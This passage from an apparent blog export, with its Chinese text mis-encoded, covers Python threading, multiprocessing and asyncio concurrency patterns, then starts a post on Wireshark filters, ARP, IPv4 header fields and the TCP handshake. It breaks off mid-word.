èµ„æºç«äº‰åœºæ™¯ä¸‹ï¼Œé—®é¢˜å°±å‡ºæ¥äº† Starting up -------- The count is 1 ------------ The count is 2 The count is 3 ------------ ------------ The count is 5 The count is 5 ------------ ------------ The count is 5 ------------ Finishing up The count is 7 The count is 8 ------------ ------------ The count is 8 ------------ The count is 8 ------------ å¤šçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥é—®é¢˜ï¼Œä¸€ç§æ˜¯åŠ é”ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨atomic message queue.pythonä¸­æœ‰äº›moduleå†…éƒ¨å·²ç»åŠ äº†é”ï¼Œlogging,decimal(thread local),databases(reader locks and writer locks),email(atomic message queue)ã€‚é”åœ¨å†™operating systemçš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯å…¶ä»–æ—¶å€™ä¸è¦ç”¨ã€‚æ‰€æœ‰çš„èµ„æºéƒ½åº”è¯¥åªèƒ½åŒæ—¶è¢«ä¸€æ¡çº¿ç¨‹æ“ä½œã€‚threadingä¸­çš„joinå°±å±äºä¸€ç§barrierï¼ˆä¸»çº¿ç¨‹è°ƒç”¨t.joinï¼Œå°±æ˜¯ç­‰tè·‘å®Œäº†ä¹‹åï¼Œä¸»çº¿ç¨‹å†å»å¹²æ¥ä¸‹æ¥çš„äº‹æƒ…ï¼‰ Raymond Hettingeræåˆ°message queueçš„task_doneæ–¹æ³•æ˜¯ä»–createdçš„ã€‚(è¿˜æ˜¯atomic measge queue, å¥½åƒæ˜¯å†…éƒ¨åŠ äº†é”ï¼Œæ“ä½œqueueä¸­èµ„æºçš„åªæœ‰é‚£ä¹ˆä¸€æ¡çº¿ç¨‹ï¼Œå½“ç„¶ä¸å­˜åœ¨å¹¶å‘é—®é¢˜). å…¶å®raymodä¹Ÿæåˆ°äº†ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨RabbitMQç­‰,ZEROMQ ç”šè‡³æ˜¯databaseï¼ˆå†…éƒ¨æœ‰read write lockï¼‰ def worker(): while True: item = q.get() do_work(item) q.task_done() q = Queue() for i in range(num_worker_threads): t = Thread(target=worker) t.daemon = True t.start() for item in source(): q.put(item) q.join() # block until all tasks are done çˆ¬è™«ç®€å•çš„å¤šçº¿ç¨‹ç‰ˆæœ¬æ˜¯æ¯ä¸ªçº¿ç¨‹åˆ›å»ºçš„æ—¶å€™ï¼Œå°±ç»™å‡ºä¸€ä¸ªargs = [someurl] ï¼Œç„¶åæœ‰å¤šå°‘ä»»åŠ¡å°±åˆ›å»ºå¤šå°‘çº¿ç¨‹ã€‚ä½†æ˜¯è¿™æ ·åšè¿Ÿæ—©ä¼šç¢°ä¸Šæ“ä½œç³»ç»Ÿå¯¹æœ€å¤§çº¿ç¨‹æ•°çš„è®¾ç½®[æ®è¯´400+]ï¼Œäºæ˜¯åˆæƒ³åˆ°ç”¨threadPool,è‡ªå·±å®ç°threadpoolçš„ä¹Ÿæ˜¯å¤§æœ‰äººåœ¨ï¼ˆå†…éƒ¨æŒæœ‰ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼Œä¸åœå»é˜Ÿåˆ—é‡Œè·å–ä»»åŠ¡ï¼‰ã€‚(https://www.shanelynn.ie/using-python-threading-for-multiple-results-queue/) error: can&#39;t start new thread File &quot;/usr/lib/python2.5/threading.py&quot;, line 440, in start _start_new_thread(self.__bootstrap, ()) é‚£ä¹ˆæ¯”è¾ƒå®ç”¨çš„ä½¿ç”¨åœºæ™¯æ˜¯ï¼Œspawn 10æ¡çº¿ç¨‹å»è¿›è¡Œwhile not queue.empty() -&gt; requests.get()æ“ä½œï¼Œå„è‡ªåœ¨å®Œæˆä¹‹åä¸¢åˆ°ä¸€ä¸ªé€šç”¨çš„å®¹å™¨ä¸­ï¼Œå†ç”±message queueç‹¬ç«‹å®Œæˆæ‰€æœ‰responseçš„processing.åˆ°è¿™é‡Œè¿˜åªæ˜¯åœç•™åœ¨å¤šçº¿ç¨‹çš„é˜¶æ®µã€‚ å¤šè¿›ç¨‹äººä»¬å¾ˆå®¹æ˜“æƒ³åˆ°å¤šè¿›ç¨‹çš„ç‰ˆæœ¬ï¼Œå¯ä»¥ä¸ç”¨é¡¾è™‘GILçš„å­˜åœ¨ from multiprocessing import Pool import time COUNT = 50000000 def countdown(n): while n&gt;0: n -= 1 if __name__ == &#39;__main__&#39;: pool = Pool(processes=2) start = time.time() r1 = pool.apply_async(countdown, [COUNT//2]) r2 = pool.apply_async(countdown, [COUNT//2]) pool.close() pool.join() end = time.time() print(&#39;Time taken in seconds -&#39;, end - start) å¤šè¿›ç¨‹ä¹‹é—´å†…å­˜ä¸å…±äº«ï¼ŒåŒæ­¥æ–¹å¼æ˜¯ä½¿ç”¨Queue(fifo) #!/usr/bin/env python3 import multiprocessing import time import random import os from multiprocessing import Queue q = Queue() def hello(n): time.sleep(random.randint(1,3)) q.put(os.getpid()) print(&quot;[{0}] Hello!&quot;.format(n)) processes = [ ] for i in range(10): t = multiprocessing.Process(target=hello, args=(i,)) processes.append(t) t.start() for one_process in processes: one_process.join() mylist = [ ] while not q.empty(): mylist.append(q.get()) print(&quot;Done!&quot;) print(len(mylist)) print(mylist) æ›´åŠ Pythonicçš„æ–¹å¼æ˜¯ä½¿ç”¨asyncio Asyncioä¼˜ç‚¹åŒ…æ‹¬ Based on futures Faster than threads Massive I/O concurrency async def fetch_url(url): return await aiohttp.request(&#39;GET&#39; , url) ## you get the future, the function is not executed immediatedly async def fetch_two(url_a,url_b): future_a = fetch_url(url_a) future_b = fetch_url(url_b) a ,b = await asyncio.gather(future_a, future_b) ## ä¸€æ—¦å¼€å§‹awaitè¿™ä¸ªfuture,è¿™ä¸ªcoroutineæ‰ä¼šè¢«åŠ å…¥event loop return a, b ä¸Šè¿°ä»£ç è™½ç„¶è¿˜æ˜¯åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­è¿è¡Œï¼Œè¿˜å—åˆ°GILåˆ¶çº¦ï¼Œä½†æ˜¯ç”±äºæ˜¯I/Oæ“ä½œï¼Œæ‰€ä»¥ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ã€‚åªæ˜¯åœ¨processè¿”å›çš„ç»“æœæ˜¯ï¼Œå°±ä¼šå—åˆ°GILçš„å½±å“äº†ã€‚ï¼ˆå®é™…æ“ä½œä¸­ä½ ä¼šå‘ç°coroutineè¿˜æ²¡æ‰§è¡Œå°±timeoutäº†ï¼‰ @asyncio.coroutineè¿™ä¸ªdecoratoræ˜¯3.4å‡ºç°çš„ï¼Œ3.5ä¹‹åç›´æ¥ä½¿ç”¨async awaitå…³é”®å­—ã€‚è¿™ä¸ªdecoratorä¹Ÿå°±è¿‡æ—¶äº† import asyncio import time async def speak_async(): print(&#39;starting====&#39;) r = await asyncio.sleep(1) ##è¿™é‡Œä¸èƒ½ä½¿ç”¨time.sleep(1) print(&#39;OMG asynchronicity!&#39;) loop = asyncio.get_event_loop() loop.run_until_complete(speak_async()) loop.close() å¯¹äºé˜»å¡å¼çš„ioè°ƒç”¨ï¼Œä¸æ˜¯è¯´åŠ ä¸€ä¸ªawaitå‡½æ•°å°±èƒ½å®ç°å¼‚æ­¥äº†To use requests (or any other blocking libraries) with asyncio, you can use BaseEventLoop.run_in_executor to run a function in another thread and yield from it to get the result.asyncioæ¯•ç«Ÿåªæœ‰ä¸€æ¡çº¿ç¨‹ï¼Œæ‰€ä»¥requestè¿™ç§é˜»å¡å¼çš„å‡½æ•°ä¸èƒ½ç›´æ¥æ‹¿æ¥ç”¨ï¼Œéœ€è¦run_in_executoræˆ–è€…ç”¨çº¿ç¨‹æ± ã€è¿›ç¨‹åŒ…è£…ä¸€ä¸‹ import time import requests import asyncio async def getUrlBlocking(url): print(&quot;starting request to %s &quot; % url) loop = asyncio.get_event_loop() response = await loop.run_in_executor(None, requests.get, url) print(response.status_code) return response async def gotResponse(url): res = await getUrlBlocking(url) print(res.text) return res if __name__ == &quot;__main__&quot;: s = time.perf_counter() loop = asyncio.get_event_loop() tasks = [gotResponse(&quot;https://jsonplaceholder.typicode.com/posts/%s&quot; % i) for i in range(100)] loop.run_until_complete(asyncio.wait(tasks)) loop.close() elapsed = time.perf_counter() - s print(f&quot;{__file__} executed in {elapsed:0.2f} seconds.&quot;) async awaitè¦æ±‚awaitçš„ä¸œè¥¿æ˜¯awaitableçš„ asyncioä¸­åˆ›å»ºä»»åŠ¡çš„è¯­æ³•æœ‰å¥½å‡ ç§import asyncio async def doit(i): print(&quot;Start %d&quot; % i) await asyncio.sleep(3) print(&quot;End %d&quot; % i) return i if __name__ == &#39;__main__&#39;: loop = asyncio.get_event_loop() #futures = [asyncio.ensure_future(doit(i), loop=loop) for i in range(10)] #futures = [loop.create_task(doit(i)) for i in range(10)] futures = [doit(i) for i in range(10)] result = loop.run_until_complete(asyncio.gather(*futures)) print(result) ä»¥ä¸Šè¿™ä¸‰ç§åˆ›é€ å‡ºæ¥çš„taskå…¨éƒ¨éƒ½æ˜¯æ— åºæ‰§è¡Œçš„ã€‚ä¸è¿‡python3.7ä»¥åå®˜æ–¹æ›´æ¨èä½¿ç”¨asyncio.create_task (3.7+æ·»åŠ çš„)è€Œä¸æ˜¯ensure_future(3.7ä¹‹å‰)å»åˆ›å»ºä»»åŠ¡ã€‚ æ‰€ä»¥ä¸€èˆ¬çš„å°†async tasksæ·»åŠ åˆ°event loopçš„å¥—è·¯æ˜¯è¿™æ ·çš„ã€‚mainå‡½æ•°æ˜¯async çš„ï¼Œ3.5-3.6éº»çƒ¦ä¸€ç‚¹ï¼Œ3.7æœ€ç®€å•python3.5-3.6 loop = asyncio.get_event_loop() try: loop.run_until_complete(main()) finally: loop.close() python 3.7 asyncio.run(main()) # Python 3.7+ Generator functions are, as it so happens, the foundation of async IO (regardless of whether you declare coroutines with async def rather than the older @asyncio.coroutine wrapper). Technically, await is more closely analogous to yield from than it is to yield. (But remember that yield from x() is just syntactic sugar to replace for i in x(): yield i.) generatorå‡½æ•°(æ— è®ºæ˜¯ç”¨asyc defåˆ›å»ºçš„è¿˜æ˜¯ç”¨@asyncio.coroutineçš„docorator)æ˜¯asyncioçš„åŸºç¡€ã€‚ä»æŠ€æœ¯å±‚é¢æ¥è®²,await â‰ˆâ‰ˆ yield from (ä½†æ˜¯è®°ä½yield from x() åªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–è€Œå·²) Mulitiprocessing is good , asyncio is great, Why not bothä¹Ÿå°±æ˜¯è¯´ï¼ŒI/Oæ“ä½œç”¨asyncioï¼Œæ•°æ®å¤„ç†ä½¿ç”¨multi-processingï¼Œè¿™å‡ ä¹æ˜¯å®Œç¾çš„è§£å†³æ–¹æ¡ˆäº†æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªasync eventæ˜¯è·‘åœ¨ä¸€æ¡çº¿ç¨‹ï¼Œä¸€ä¸ªcpu coreä¸Šå°±è¶³å¤Ÿäº†ã€‚John Reese - Thinking Outside the GIL with AsyncIO and Multiprocessing - PyCon 2018 è¿™é‡Œè®²è¿°äº†å¦‚ä½•åœ¨å¤šä¸ªcoreä¹‹é—´è·‘ä¸€ä¸ªevent loopç”±äºcoroutineå’Œmulti-processingæ˜¯ä¸¤ä¸ªç›¸å¯¹ç‹¬ç«‹çš„æ¨¡å—ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æŠŠä¸¤è€…ç»“åˆèµ·æ¥ã€‚ç”¨å¤šè¿›ç¨‹è¿›è¡Œæ•°æ®å¤„ç†ï¼Œæ¯ä¸ªè¿›ç¨‹ä¸­å„è‡ªæœ‰ç‹¬ç«‹çš„coroutineåœ¨è¿è¡Œã€‚ async def run_loop(tx, rx): ... ## real work here limit = 10 pending = set() while True: while len(pending) &lt; limit: task = tx.get_nowait() fn ,args, kwargs = task pending.add(fn(args,kwargs)) done, pending = await asyncio.wait(pending, ..) for future in done: rx.put_nowait(await future) def bootstrap(tx, rx): loop = asyncio.new_event_loop() asyncio.set_event_loop(loop) loop.run_untile_complete(run_loop(tx, rx)) def main(): p = multiprocessing.Process(target = bootstrap, args = (tx, rx)) p.start() å®é™…æ“ä½œå¯èƒ½çœ‹èµ·æ¥åƒè¿™æ · async def fetch_url(url): return await aiohttp.request(&#39;GET&#39; , url) def fetch_all(urls): tx, rx = Queue(), Queue() Process( target=bootstrap, args=(tx,rx) ).start() for url in urls: task = fetch_url,(url,), {} tx.put_nowait(task) å·²ç»å¼€æºaioprocessing pip install aiomultiprocess å…³äºåç¨‹coroutineæ˜¯ä¸€ä¸ªåœ¨å¾ˆå¤šç¼–ç¨‹è¯­è¨€ä¸­éƒ½æœ‰çš„æ¦‚å¿µï¼Œåœ¨pythonä¸­coroutineä¸€èˆ¬æŒ‡çš„æ˜¯generator based coroutinesã€‚é¦–å…ˆï¼Œå› ä¸ºåç¨‹æ˜¯ä¸€ç§èƒ½æš‚åœçš„å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒæš‚åœæ˜¯ä¸ºäº†ä»€ä¹ˆï¼Ÿä¸€èˆ¬æ˜¯ç­‰å¾…æŸä¸ªäº‹ä»¶ï¼Œæ¯”å¦‚è¯´æŸä¸ªè¿æ¥å»ºç«‹äº†ï¼›æŸä¸ª socket æ¥æ”¶åˆ°æ•°æ®äº†ï¼›æŸä¸ªè®¡æ—¶å™¨å½’é›¶äº†ç­‰ã€‚è€Œè¿™äº›äº‹ä»¶åº”ç”¨ç¨‹åºåªèƒ½é€šè¿‡è½®è¯¢çš„æ–¹å¼å¾—çŸ¥æ˜¯å¦å®Œæˆï¼Œä½†æ˜¯æ“ä½œç³»ç»Ÿï¼ˆæ‰€æœ‰ç°ä»£çš„æ“ä½œç³»ç»Ÿï¼‰å¯ä»¥æä¾›ä¸€äº›ä¸­æ–­çš„æ–¹å¼é€šçŸ¥åº”ç”¨ç¨‹åºï¼Œå¦‚ select, epoll, kqueue ç­‰ç­‰ã€‚understand-python-asyncio åŸºç¡€æ˜¯generator(ä»»ä½•åŒ…å«yield expressionçš„å‡½æ•°) $ &gt;&gt;&gt;def gen_fn(): print(&#39;start&#39;) yiled 1 print(&#39;middle&#39;) yield 2 print(&#39;done&#39;) $ &gt;&gt;&gt; gen = gen_fn() $ &gt;&gt;&gt; gen $ &lt;generator object gen_fn at 0x7f83cddc0b48&gt; &gt;&gt;&gt; gen.gi_code.co_code //å¯¹åº”çš„bytecode b&#39;t\\x00d\\x01\\x83\\x01\\x01\\x00d\\x02V\\x00\\x01\\x00t\\x00d\\x03\\x83\\x01\\x01\\x00d\\x04V\\x00\\x01\\x00t\\x00d\\x05\\x83\\x01\\x01\\x00d\\x00S\\x00&#39; &gt;&gt;&gt; len(gen.gi_code.co_code) 40 &gt;&gt;&gt; gen.gi_frame.f_lasti //instruction pointer , è¯´æ˜å½“å‰æ‰§è¡Œåˆ°å“ªä¸ªæŒ‡ä»¤äº†ï¼Œ-1è¯´æ˜è¿˜æ²¡æœ‰å¼€å§‹æ‰§è¡Œ -1 &gt;&gt;&gt; next(gen) start 1 &gt;&gt;&gt; ret = next(gen) middle &gt;&gt;&gt; ret 2 // nextæ–¹æ³•è¿”å›çš„æ˜¯yieldé‡Œé¢çš„å€¼ &gt;&gt;&gt; next(gen) done Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; StopIteration // è¿™æ˜¯æ­£å¸¸çš„ï¼Œè¯´æ˜generatoræ‰§è¡Œå®Œæ¯• &gt;&gt;&gt; import dis &gt;&gt;&gt; dis.dis(gen) 2 0 LOAD_GLOBAL 0 (print) 2 LOAD_CONST 1 (&#39;start&#39;) 4 CALL_FUNCTION 1 6 POP_TOP 3 8 LOAD_CONST 2 (1) 10 YIELD_VALUE 12 POP_TOP 4 14 LOAD_GLOBAL 0 (print) 16 LOAD_CONST 3 (&#39;middle&#39;) 18 CALL_FUNCTION 1 20 POP_TOP 5 22 LOAD_CONST 4 (2) 24 YIELD_VALUE 26 POP_TOP 6 28 LOAD_GLOBAL 0 (print) 30 LOAD_CONST 5 (&#39;done&#39;) 32 CALL_FUNCTION 1 34 POP_TOP 36 LOAD_CONST 0 (None) 38 RETURN_VALUE &gt;&gt;&gt; python3.3ä¸­å¼€å§‹å‡ºç°yieldå…³é”®å­—ï¼Œpython3.4ä¸­å¼€å§‹å¼•å…¥asyncioæ ‡å‡†åº“ï¼Œpython 3.5æ ‡å‡†åº“ä¸­å‡ºç°çš„async awaitå…³é”®å­—åªæ˜¯åŸºäºgeneratorçš„sytatic sugarï¼Œé‚£ä¹ˆgeneratoræ˜¯å¦‚ä½•å®ç°çš„. The yield instruction takes the current executing context as a closure, and transforms it into an own living object. This object has a iter method which will continue after this yield statement.So the call stack gets transformed into a heap object. è§£é‡Šgeneratorå®ç°åŸç†çš„æ–‡ç«  python 2.5å¼€å§‹ï¼Œgeneratorèƒ½å¤Ÿè¿”å›æ•°æ®ï¼Œè¿™ä¹‹å‰è¿˜åªæ˜¯iteratbleçš„ è¿˜å¯ä»¥é€šè¿‡gen.sendå‡½æ•°å¾€generatorä¼ å‚æ•°event-loopçš„å®ç°åŸç†ç®€è¿° pythonä¸­event loopæ˜¯plugableçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®Œå…¨å¯ä»¥æä¾›è‡ªå·±å¼€å‘çš„ç‰ˆæœ¬ã€‚æ‰€ä»¥å°±æœ‰äº†uvloopè¿™ç§è·‘åˆ†ç‰¹åˆ«é«˜çš„ã€‚asyncioåŒ…é»˜è®¤åªæä¾›äº†ä¸¤ç§eventLoopçš„å®ç°ï¼Œåˆ†åˆ«æ˜¯class asyncio.SelectorEventLoop(unixå’Œwindowsä¸Š)class asyncio.ProactorEventLoop(windowsä¸Š)æŸ¥çœ‹windows_events.pyä¸­ï¼Œé»˜è®¤çš„asyncio.get_event_loop()è·å¾—çš„å°±æ˜¯SelectorEventLoop åŸºäºasyncioçš„æœ‰åçš„åº“åŒ…æ‹¬aiohttpå’Œaiofileã€‚äºŒè€…éƒ½æ˜¯å¯¹i/oè¿›è¡Œæ“ä½œ ã€‚æ›´å¤šçš„è¿˜æœ‰aio-redis, aio-lrucacheâ€¦. ç‰µæ¶‰åˆ°ä¸€äº›celeryçš„ç‚¹celeryèƒ½å¤Ÿåˆ©ç”¨å¥½å¤šè¿›ç¨‹todo å‚è€ƒå¤šè¿›ç¨‹è¿˜å¯ä»¥ç‰µæ¶‰åˆ°è¿›ç¨‹æ± çš„æ¦‚å¿µWhat is the Python Global Interpreter Lock (GIL)?multiprocessing-vs-multithreading-in-python-what-you-need-to-knowA. Jesse Jiryu DavisHow Do Python Coroutines WorkA Jesse Jiryu Davis Grok the GIL Write Fast And Thread Safe Python PyCon 2017 the only thing two threads cannâ€™t do in once in Python is run pythonBehold, my friends, the getaddrinfo lock in Pythonâ€™s socketmodule.c: A. Jesse Jiryu Daviså…³äºpythonä¸­parallel dns queryçš„æ–‡ç« ä¹Ÿå¾ˆå¥½uvloopè·‘åˆ†asyncio in python","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"tcpdumpå’Œwiresharkä½¿ç”¨æ‰‹å†Œ","date":"2018-11-10T20:57:53.000Z","path":"2018/11/10/2018-11-10-tcpdump-and-wireshark-etc/","text":"wireshark expression cheetsheettcpdump cheetwiresharkèƒ½æŠ“tcp,arp,http,dns,udp,icmp,dhcpâ€¦ å…ˆä»wiresharkè¯´èµ·ï¼Œåœ¨win10ä¸Šå®‰è£…wiresharkéœ€è¦é¡ºå¸¦è£…ä¸Šwinpacpï¼Œä¸è¿‡ç°åœ¨çš„å®‰è£…åŒ…é»˜è®¤éƒ½ä¼šæç¤ºå»å®‰è£…ï¼Œæ‰€ä»¥ä¹Ÿéƒ½å¾ˆç®€å•tcpdumpåœ¨Linuxä¸Šæ¯”è¾ƒå®¹æ˜“å®‰è£…ï¼Œç±»ä¼¼äºwiresharkçš„command line tool wiresharkçš„filterç°åœ¨wiresharkçš„filteréƒ½ä¼šè‡ªåŠ¨æç¤ºäº†ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šéšæ‰‹æ•²å‡ ä¸ªå°±è¡Œäº† http ##åªçœ‹httpçš„http.requesttcp.dstport == 443 ## åªçœ‹httpsçš„tcp.port == 113 ## ä¸ç®¡æ˜¯sourceè¿˜æ˜¯destinationï¼Œåªè¦æ˜¯port 113çš„éƒ½ç­›å‡ºæ¥(113æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç«¯å£ Identification Protocol, Ident)udp.port== 53 ## ç­›é€‰å‡ºæ‰€æœ‰çš„dnsæŸ¥è¯¢ip.addr eq 192.168.1.3 and ip.addr eq 192.168.1.1 //å‡è®¾æœ¬æœºipæ˜¯192.168.1.3å¹¶ä¸”è·¯ç”±å™¨æ˜¯192.168.1.1çš„è¯ï¼Œè¿™ä¸ªå¯ä»¥ç­›é€‰å‡ºæ‰€æœ‰çš„ipv4åŒ…ip.src == 192.168.1.3 &amp;&amp; tcp.port == 80 //ä¸¤ä¸ªå‘½ä»¤ä¸²è”èµ·æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ip.addr //æ—¢åŒ…å«srcä¹ŸåŒ…å«dstudp ||http // udpæˆ–è€…httpçš„åŒ…frame.len &lt;=128 //æ˜¾ç¤ºæ‰€æœ‰ä½“ç§¯å°äº128ä¸ªå­—èŠ‚çš„åŒ… //å¦‚æœä¸€å¼€å§‹å°±åªå¯¹ç‰¹å®šåè®®æ„Ÿå…´è¶£capture -&gt; filters é‡Œé¢å¯ä»¥é€‰æ‹©åªæŠ“æŸäº›åè®®çš„åŒ…ã€‚å› ä¸ºé»˜è®¤æ˜¯ä»€ä¹ˆéƒ½æŠ“ï¼Œè¿™æ ·ä¼šå°‘å¾ˆå¤š ä¸€äº›æœ‰ç”¨çš„æ“ä½œé€‰ä¸­ä¸€ä¸ªcolumnï¼Œå³é”® -&gt; follow -&gt;tcpstream ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ä¸ªpacketçš„æ¥å›ä¿¡æ¯ã€‚ï¼ˆå¦‚æœæ˜¯httpçš„è¯ï¼Œrequestå’Œresponseéƒ½ç»™å‡ºæ¥äº†ï¼‰èœå•æ ä¸Šçš„Statistics -&gt; conversatitons ï¼ˆæŸ¥çœ‹æ‰€æœ‰çš„ä¼šè¯ï¼‰wiresharkçš„ç»“æœå¯ä»¥saveæˆ.capæ–‡ä»¶ï¼Œä¸‹æ¬¡å¯ä»¥æ‰“å¼€èœå•æ ä¸Šçš„Statistics -&gt; protocol Hierarchy(æŸ¥çœ‹æ‰€æœ‰çš„åè®®)èœå•æ view -&gt; coloring ruleï¼ˆç›´æ¥å°†ç‰¹å®šçš„åè®®å˜æˆç‰¹å®šé¢œè‰²çš„èƒŒæ™¯ï¼Œæ–¹ä¾¿è¯†åˆ«ï¼‰view -&gt; time displayformat(æ ¼å¼åŒ–packetçš„æ—¶é—´æ˜¾ç¤ºæˆä¾¿äºè¯†åˆ«çš„æ—¶é—´ï¼Œå› ä¸ºé»˜è®¤çš„æ˜¾ç¤ºå•ä½æ˜¯æ¯«ç§’)Statistics -&gt; endpoints // æŸ¥çœ‹æ‰€æœ‰è¿æ¥è¿‡çš„ip Statistics -&gt; packet length //æŸ¥çœ‹æ‰€æœ‰çš„packet lengthï¼ˆå¤šæ•°æ—¶å€™åŒ…çš„å¤§å°åœ¨40-79å’Œ1280-2559è¿™ä¸ªåŒºé—´é‡Œé¢ï¼Œæ²¡æœ‰å°äº40çš„ï¼Œå› ä¸ºæœ€å°‘å¾—40ä¸ªå­—èŠ‚ï¼‰ arp(addression resolution protocol)ä¸€å°ç”µè„‘åœ¨å‘å‡ºå»ä¸€ä¸ªåŒ…ä¹‹å‰ï¼Œå·²ç»çŸ¥é“destçš„ipåœ°å€ï¼Œä½†æ˜¯ä¸çŸ¥é“è¿™ä¸ªipåœ°å€å¯¹äºçš„macåœ°å€æ˜¯å¤šå°‘ï¼Œäºæ˜¯ä¼šå‘å‡ºä¸€ä»½arp requestã€‚åœ¨å±€åŸŸç½‘å†…éƒ¨ï¼Œæ˜¯è¿™æ ·çš„ who has 192.168.1.1 ? Tell 192.168.1.7 //ç”µè„‘å‘å‡ºarpè¯·æ±‚ 192.168.1.1 is at 00:xx:00:xe:b5 //å¾ˆå¿«å¾—åˆ°äº†å›åº” arpåŒ…ç»“æ„ ä¸€ä¸ªipv4åœ°å€éœ€è¦32ä¸ªbitè¡¨ç¤º,192.168.1.1è¿™ç§å†™æ³•å«åšbase10ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ192.168è¿™ä¿©ä¸€èˆ¬è¡¨ç¤ºçš„æ˜¯network address, .1.1è¿™ä¿©ä¸€èˆ¬è¡¨ç¤ºçš„æ˜¯Host address(physical computer)net mask(255.255.0.0) 192.168.1/16ã€‚ é€‰ä¸­ä¸€ä¸ªtcpåŒ…ï¼ŒæŸ¥çœ‹Internet Protocol Version4 ..(è¿™é‡Œå°±æ˜¯ç¬¬ä¸‰å±‚,networkå±‚äº†)ã€‚ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯version: 4Header length 20bytesDifferentiated Services Filed(ä¸æ‡‚)Total Length(è¿™ä¸ªæ˜¯åŒ…å«äº†)Identification(ç±»ä¼¼äºid)Flags : 0x4000, Dontâ€™t fragment(è¿™ä¸ªç‰µæ¶‰åˆ°mtu,maximum transmission unit size, è¿™ä¸ªæ•°å€¼åœ¨ethernetä¸Šæ˜¯1500bytesã€‚å‡å¦‚ä¸€ä¸ªåŒ…å¤§å°è¶…è¿‡è¿™ä¸ªæ•°ï¼Œåˆ‡æˆä¸¤ä¸ª,ä¹Ÿå°±æ˜¯fragment.è¿™ä¸ªFlagsé‡Œé¢å¯ä»¥çœ‹åˆ°More fragment: not set ï¼ˆ0ï¼‰ï¼Œæ„æ€å°±æ˜¯è¯´è¿™ä¸ªåŒ…æ²¡æœ‰è¢«åˆ‡æˆä¸¤ä¸ªã€‚æœ‰ä¸¤ç§æƒ…å†µä¸‹è¿™ä¸ªæ ‡å¿—è®¾ä¸º0ï¼Œä¸€æ˜¯æ²¡æœ‰åˆ†åŒ…ï¼Œè€Œæ˜¯è¿™ä¸ªåŒ…æ°å¥½æ˜¯æœ€åä¸€ä¸ª)Fragment offsetï¼š0 (å‡å¦‚è¢«åˆ‡æˆä¸¤ä¸ªäº†ï¼Œè¿™é‡Œå°±è¡¨ç¤ºå½“å‰è¿™ä¸ªåŒ…æ˜¯è¢«åˆ‡å®Œä¹‹åçš„ç¬¬ä¸€ä¸ªè¿˜æ˜¯ç¬¬äºŒä¸ªï¼Œå°±å½“æ˜¯indexå§)ã€‚è¿™ä¸ªåŒ…æ˜¯è®¿é—®googleæ—¶ç•™ä¸‹çš„ æœ‰ä¸€ä¸ªTime to live:128 (å°±æ˜¯è¯´è¿™ä¸ªåŒ…æœ€å¤šèµ°128hopï¼Œå°±æ˜¯æœ€å¤šç»æ‰‹128ä¸ªrouterå°±ä¸¢æ‰) å†çœ‹ç¬¬å››å±‚ï¼ˆTransport layerï¼‰ï¼Œä¹Ÿå°±æ˜¯tcp,udpè¿™ç±»äº†ã€‚è¿˜æ˜¯ä¸Šé¢è¿™ä¸ªåŒ…ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯Source PortDestination Port :443 //httpsæ— ç–‘stream index: 4sequence number 496 //ç¡®ä¿æ•°æ®æ²¡æœ‰ä¸¢å¤±Acknowledgement number : 4043 //ä¸‹ä¸€ä¸ªåŒ…çš„sequence numberFlags(urg:urgent,push:push,rst:reset,sin&amp;fin(finished))è¿™å¼ å›¾é‡Œé¢å†™çš„æ˜¯Acknowledgment(æ˜¾ç„¶æ˜¯ackåŒ…)window size value: 2053(è¿™ä¸ªæ˜¯tcp receiver bufferï¼Œå•ä½æ˜¯byteï¼Œè¿™ä¸ªæ•°å€¼å˜æ¥å˜å»çš„)checksum(æ£€æŸ¥æ•°æ®å®Œæ•´) è¯´ä¸€è¯´handshaketcp packetså§‹äºä¸€ä¸ªhandshakeæ£€æŸ¥ç«¯å£ï¼Œå‘é€ä¸€ä¸ªsequence number(éšæœºçš„),å®¢æˆ·ç«¯ä¼šå‘é€ä¸€ä¸ªsyn packetåˆ°æ¥å—æ–¹ã€‚æ¥å—æ–¹ä¼šè¿”å›ä¸€ä¸ªsyn ack packet,æ¥ä¸‹æ¥å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªack packetã€‚ä¸Šè¿°æ­¥éª¤æ¯ä¸€æ¬¡sequence numberéƒ½ä¼š+1 1. Client å‘é€ SYN åŒ…ï¼ˆseq: xï¼‰ï¼Œå‘Šè¯‰ Serverï¼šæˆ‘è¦å»ºç«‹è¿æ¥ï¼›Client è¿›å…¥SYN-SENTçŠ¶æ€ï¼› 2. Server æ”¶åˆ° SYN åŒ…åï¼Œå‘é€ SYN+ACK åŒ…ï¼ˆseq: y; ack: x+1ï¼‰ï¼Œå‘Šè¯‰å®ƒï¼šå¥½çš„ï¼›Server è¿›å…¥SYN-RCVDçŠ¶æ€ï¼› 3. Client æ”¶åˆ° SYN+ACK åŒ…åï¼Œå‘ç° ack=x+1ï¼Œäºæ˜¯è¿›å…¥ESTABLISHEDçŠ¶æ€ï¼ŒåŒæ—¶å‘é€ ACK åŒ…ï¼ˆseq: x+1; ack: y+1ï¼‰ç»™ Serverï¼›Server å‘ç° ack=y+1ï¼Œäºæ˜¯ä¹Ÿè¿›å…¥ESTABLISHEDçŠ¶æ€ï¼› æ¥ä¸‹æ¥å°±æ˜¯äº’ç›¸å‘é€æ•°æ®ã€æ¥æ”¶æ•°æ®äº†â€¦â€¦ tcp 